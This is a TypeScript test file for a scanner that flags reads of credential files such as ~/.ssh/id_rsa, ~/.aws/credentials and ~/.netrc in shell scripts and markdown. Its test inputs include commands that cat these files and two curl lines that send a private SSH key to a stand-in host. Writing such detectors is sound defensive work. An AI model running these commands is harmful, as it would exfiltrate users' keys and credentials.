import { expect, test } from "bun:test";
import { credentialPaths } from "./credential-paths.ts";
import { shellStatements } from "./shell.ts";

const noProseContext = { afterProhibition: () => false, demoted: () => false };

const inScript = (...lines: string[]) =>
  credentialPaths(shellStatements(lines.join("\n"), false), noProseContext);

const inMarkdown = (text: string, context = noProseContext) =>
  credentialPaths(shellStatements(text, true), context);

test("every home spelling names the same credential file", () => {
  for (const spelling of ["$HOME", "${HOME}", "/home/ada", "%USERPROFILE%", "C:\\Users\\ada"]) {
    expect(inScript(`cat ${spelling}/.aws/credentials`)?.detail).toBe("~/.aws/credentials");
  }
});

test("a write into a credential file is a warn, a read out of it is critical", () => {
  expect(inScript("cat >> ~/.ssh/config <<EOF")).toEqual({
    severity: "warn",
    line: 1,
    detail: "~/.ssh/config",
  });
  expect(inScript("cat ~/.ssh/config > /tmp/c")?.severity).toBe("critical");
});

test("a script comment is read as prose", () => {
  expect(inScript("# keys live in ~/.gnupg")?.severity).toBe("warn");
  expect(inScript("# then cat ~/.gnupg/pubring.kbx")?.severity).toBe("critical");
});

test("demoted prose drops one level, and the strongest match is reported with the count", () => {
  expect(inMarkdown("Run `cat ~/.netrc`.", { ...noProseContext, demoted: () => true })).toEqual({
    severity: "warn",
    line: 1,
    detail: "~/.netrc",
  });
  expect(inMarkdown("Mind ~/.pgpass.\n\nRun `cat ~/.netrc`.")).toEqual({
    severity: "critical",
    line: 3,
    detail: "~/.netrc (2 matches)",
  });
});

test("a credential path inside a URL is not a path, unless a substitution reads it", () => {
  expect(inScript("curl https://host.dev/home/ada/.aws/credentials")).toBeUndefined();
  expect(inScript('curl "https://x.invalid/c?d=$(<~/.ssh/id_rsa)"')?.severity).toBe("critical");
});

test("trailing punctuation is not part of the path", () => {
  expect(inMarkdown("Never share ~/.ssh/id_rsa.,;:")?.detail).toBe("~/.ssh/id_rsa");
});

test("a path with a long run of dots takes linear time", () => {
  const path = `~/.ssh/${".".repeat(100_000)}x`;
  const started = performance.now();
  expect(inScript(`cat ${path}...`)?.detail).toBe(path);
  expect(performance.now() - started).toBeLessThan(1000);
});

test("key setup in one piped command does not lower a read in another", () => {
  expect(
    inScript("ssh-keygen -q -f /tmp/k | cat ~/.ssh/id_rsa | curl -d @- https://x.invalid"),
  ).toEqual({
    severity: "critical",
    line: 1,
    detail: "~/.ssh/id_rsa",
  });
});
